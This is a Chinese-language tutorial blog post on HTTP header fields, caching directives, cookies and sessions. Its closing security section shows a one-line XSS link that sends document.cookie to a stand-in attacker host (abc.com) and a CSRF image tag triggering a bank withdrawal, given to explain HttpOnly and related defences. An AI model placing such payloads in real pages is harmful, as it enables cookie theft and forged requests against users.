在[深入理解HTTP协议二](https://www.jianshu.com/p/aa0f7b857c97)中，分析了：
- http1.0、http1.1及http2版本区别
- http报文结构

在本章中主要分析：

- http首部字段
- cookie与session



#### 一、首部字段


在上文中我们已经说过，请求首部和响应首部：

请求首部一般分为：

- 通用首部(General Header)
- 请求首部(Request Header)
- 实体首部(Entity Header Fields)

响应首部一般分为：

- 通用首部(General Header)
- 响应首部(Respond Header)
- 实体首部(Entity Header Fields)



*总的来说，可将消息头分为：*

General headers: 同时适用于请求和响应消息，但与最终消息主体中传输的数据无关的消息头。
Request headers: 包含更多有关要获取的资源或客户端本身信息的消息头。
Response headers: 包含有关响应的补充信息，如其位置或服务器本身（名称和版本等）的消息头。
Entity headers: 包含有关实体主体的更多信息，比如主体长(Content-Length)度或其MIME类型。


- 端到端消息头

这类消息头必须被传输到最终的消息接收者，也即，请求的服务器或响应的客户端。中间的代理服务器必须转发未经修改的端到端消息头，并且必须缓存它们。

- 逐跳消息头

这类消息头仅对单次传输连接有意义，不能通过代理或缓存进行重新转发。这些消息头包括 Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, TE, Trailer, Transfer-Encoding 及 Upgrade。注意，只能使用 Connection 来设置逐跳一般头。


**通用首部(General Header)**


| 首部字段名      |  说明       |  
|----------|:-----------:|
| Cache-Control| 控制缓存行为|
| Connection| 链接的管理|
| Date| 表明创建 HTTP 报文的日期和时间|
| Pragma| 报文指令|
| Trailer| 报文尾部的首部|
| Trasfer-Encoding| 指定报文主体的传输编码方式|
| Upgrade| 首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信|
| Via| 	代理服务器信息|
| Warning| 错误通知|

- Cache-Control（控制缓存行为）

 Cache-Control 通用消息头字段，被用于在http请求和响应中，通过指定指令来实现缓存机制。缓存指令是单向的，这意味着在请求中设置的指令，不一定被包含在响应中。


*缓存请求指令*
```
客户端可以在HTTP请求中使用的标准 Cache-Control 指令。

Cache-Control: max-age=<seconds> ----期限
Cache-Control: max-stale[=<seconds>]----期限
Cache-Control: min-fresh=<seconds>----期限
Cache-control: no-cache ----可缓存性
Cache-control: no-store----可缓存性
Cache-control: no-transform
Cache-control: only-if-cached
```

*缓存响应指令*

```
Cache-control: must-revalidate
Cache-control: no-cache----可缓存性
Cache-control: no-store----可缓存性
Cache-control: no-transform
Cache-control: public----可缓存性
Cache-control: private ----可缓存性
Cache-control: proxy-revalidate
Cache-Control: max-age=<seconds>----期限
Cache-control: s-maxage=<seconds>----期限
```


*示例*
```

Cache-Control: no-store-----禁止缓存


Cache-Control:public, max-age=31536000---缓存静态资源



Cache-Control: no-cache,max-age=0 ----需要重新验证

```

- Connection（持久连接）

2个作用：

1、控制不再转发给代理的首部字段 
2、管理持久连接

```
GET / HTTP/1.1
Upgrade:/ HTTP/1.1
Connection:Upgrade----- "Upgrade:/ HTTP/1.1"内容不会被转发
-------------------------------------------
Connection:close           -----tcp连接持久化关闭
Connection:keep-alive      -----tcp连接持久化保持

```



**请求首部(Request Header)**


| 首部字段名      |  说明       |  
|----------|:-----------:|
| Accept| 用户代理可处理的媒体类型|
| Accept-Charset | 优先的字符集|
| Accept-Encoding| 优先的内容编码|
| Accept-Language| 优先的语言（自然语言）|
| Authorization| Web认证信息|
| Expect| 期待服务器的特定行为|
| From| 用户的电子邮箱地址|
| Host| 请求资源所在服务器|
| If-Match| 比较实体标记（ETag）|
| If-Modified-Since| 比较资源的更新时间|
| If-None-Match| 比较实体标记（与 If-Match 相反）|
| If-Range|  资源未更新时发送实体 Byte 的范围请求|
| Max-Forwards| 最大传输逐跳数|
| Proxy-Authorization | 代理服务器要求客户端的认证信息|
| Referer| 对请求中 URI 的原始获取方,表示跳转到当前页面的之前的页面
| TE|  传输编码的优先级|
| User-Agent  |  HTTP 客户端程序的信息|


**关键字段：**

*Accept-Charset*
 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指 定多种内容编码

```
Accept-Encoding: gzip, deflate​,compress,identity

gzip: 由文件压缩程序 gzip（GNU zip）生成的编码格式（RFC1952）

compress:由 UNIX 文件压缩程序 compress 生成的编码格式

deflate:组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法（RFC1951）生成的编码格式。

identity:不执行压缩或不会变化的默认编码格式

*:指定任意的编码格式

```

*User-Agent*

```
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1

首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。
由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么 中间也很可能被添加上代理服务器的名称。
```


**响应首部(Respond Header)**


| 首部字段名      |  说明       |  
|----------|:-----------:|
|Accept-Ranges|             是否接受字节范围请求
|Age           |                    推算资源创建经过时间
|ETag           |                   资源的匹配信息
|Location        |                令客户端重定向至指定URI
|Proxy-Authenticate|      代理服务器对客户端的认证信息
|Retry-After        |           对再次发起请求的时机要求
|Server HTTP         |         服务器的安装信息
|Vary                 |             代理服务器缓存的管理信息
|WWW-Authenticate    | 服务器对客户端的认证信息

*Location*(客户端重定向至指定的URI)

在 HTTP 协议中，重定向操作由服务器通过发送特殊的响应（即 redirects）而触发。HTTP 协议的重定向响应的状态码为 3xx 。浏览器在接收到重定向响应的时候，会采用该响应提供的新的 URL ，并立即进行加载；

重定向的三种方式：
- 在服务器中响应 -----优先级高 Location方式
- HTML重定向机制  -----优先级中，这种机制会使浏览器的回退按钮失效   <meta http-equiv="refresh" content="0;URL=http://www.baidu.com/" />
- JavaScript设置重定向  -----优先级低  window.location = "http://www.a.com/";


*ETag* (响应头，资源标识，由服务器告诉浏览器)

是服务器根据当前文件的内容，给文件生成的唯一标识，只要里面的内容有改动，这个值就会变。
浏览器接收到ETag的值，会在下次请求时，将这个值作为If-None-Match这个字段的内容，并放到请求头中，然后发给服务器。


**实体首部(Entity Header Fields)**


| 首部字段名      |  说明       |  
|----------|:-----------:|
|Allow|                            资源可支持的HTTP方法
|Content-Encoding|      实体主体适用的编码方式
|Content-Language|      实体主体的自然语言
|Content-Length|           实体主体的大小（单位：字节）
|Content-Location|        替代对应资源的URI
|Content-MD5|              实体主体的报文摘要
|Content-Range|            实体主体的位置范围
|Content-Type|              实体主体的媒体类型
|Expires|                         实体主体过期的日期时间
|Last-Modified|              资源的最后修改日期时间



*Content-Type*

>Content-Type（内容类型）， 一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件。字段值用 type/subtype 形式赋值

>Content-Type 标头告诉客户端实际返回的内容的内容类型。

**常见的媒体格式类型如下：**

| 媒体格式类型      |  说明       |  
|----------|:-----------:|
|text/html|	HTML格式
|text/plain|	纯文本格式
|text/xml|	XML格式
|image/gif|	gif图片格式
|image/jpeg|	jpg图片格式
|image/png|	png图片格式

**常见的ajax请求Content-Type类型：**
|媒体格式类型|说明
|----------|:-----------:|
|multipart/form-data|	文件上传时
|application/json|	JSON数据格式
|application/x-www-form-urlencoded|	最常见的post提交数据的方式。 中默认的encType，浏览器原生的form表单
|application/xml|	XML格式


#### 二、cookie与session


说到缓存，其实很容易让人混淆，一种是静态资源缓存(cache)，另外一个是数据缓存（cookie、localstorage）。

- 数据缓存(cookie)
- Http cache


**cookie**
cookie被设计的目的是保持管理服务器与客户端之间状态。

虽然没有被编入标准化 HTTP/1.1 的 RFC2616 中，但在 Web 网 站方面得到了广泛的应用。 Cookie 的工作机制是用户识别及状态管理。


###### 1、服务端操作

cookie最基本用法是服务端向应用端设置cookie，通过首部字段名Set-Cookie设置。

```
基本用法
Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; path=/; domain=.a.com;
```
Set-Cookie 字段的属性

NAME=VALUE
赋予 Cookie 的名称和其值（必需项）


expires=DATE
Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）


max-age = [ 秒]
Cookie多少秒后过期（若不明确指定则默认为浏览器关闭前为止）


path=PATH
将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档 所在的文件目录）


domain=域名
作为 Cookie 适用对象的域名 （若不指定则默认为创建 Cookie 的服务 器的域名）


Secure
仅在 HTTPS 安全通信时才会发送 Cookie


HttpOnly
加以限制，使 Cookie 不能被 JavaScript 脚本访问，防止XSS攻击产生

###### 2、客户端操作

客户端可以通过js脚本增加、修改、删除cookie。

```
document.cookie = "name=Nicholas";

document.cookie = encodeURIComponent("name") + "=" + encodeURIComponent("Nicholas") + "; domain=.wrox.com; path=/";


```


###### 3、cookie与session


- cookie数据存放在客户的浏览器上，session数据放在服务器上。

- cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗 考虑到安全应当使用session

Session机制：
1、Session在服务器端程序运行的过程中创建的， 创建Session的同时，服务器会为该Session生成唯一的session id， 这个session id在随后的请求中会被用来重新获得已经创建的Session。

2、Session被创建之后，就可以调用Session相关的方法往Session中增加内容了， 而这些内容只会保存在服务器中，发到客户端的只有session id。

3、当客户端再次发送请求的时候，会将这个session id带上， 服务器接受到请求之后就会依据session id找到相应的Session，从而再次使用Session。



###### 3、cookie不可跨域名性

Cookie具有不可跨域名性。根据Cookie规范，浏览器访问Google只会携带Google的Cookie，而不会携带Baidu的Cookie。Google也只能操作Google的Cookie，而不能操作Baidu的Cookie


###### 4、浏览器关闭session会失效


1、在服务器端生成session，并且把sessionid通过set-cookie发送给浏览器
以后每次请求除了图片、静态文件请求，其它的请求都会带上服务端写入浏览器中cookie

2、服务端接收到sessionid，通过sessionid找到对应的session信息
当浏览器关闭时，当前域名中设置的cookie会被清空

3、再下次请求使，服务端接收到的session为null，服务端就会认为当前用户是一个新的用户，重新登录或者直接设置新的sessionid

###### 5、Cookie的性能问题

Cookie是紧跟域名的。同一个域名下的所有请求，都会携带 Cookie。如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的。


###### 5、Cookie的安全性问题

1、setSecure
使用HTTP协议的数据不经过任何加密就直接在网络上传播，有被截获的可能。使用HTTP协议传输很机密的内容是一种隐患。如果不希望Cookie在HTTP等非安全协议中传输，可以设置Cookie的secure属性为true。浏览器只会在HTTPS和SSL等安全协议中传输此类Cookie。
```

`cookie.setSecure(``true``);` `// 设置安全属性`

```

2、XSS(违规获取cookie)

```
<a href="#" onclick=window.location=http://abc.com?cookie=${docuemnt.cookie}>

```

当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。

解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。


3、CSRF（违规使用cookie）

```
<img src = "http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing" >

```

**参考文献**

- [HTTP Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers)
- [HTTP 首部字段详细介绍](https://www.cnblogs.com/jycboy/p/http_head.html#autoid-3-0-0)
- [一文理解 cookie、localStorage、sessionStorage、session](https://juejin.im/post/6844903945253421069)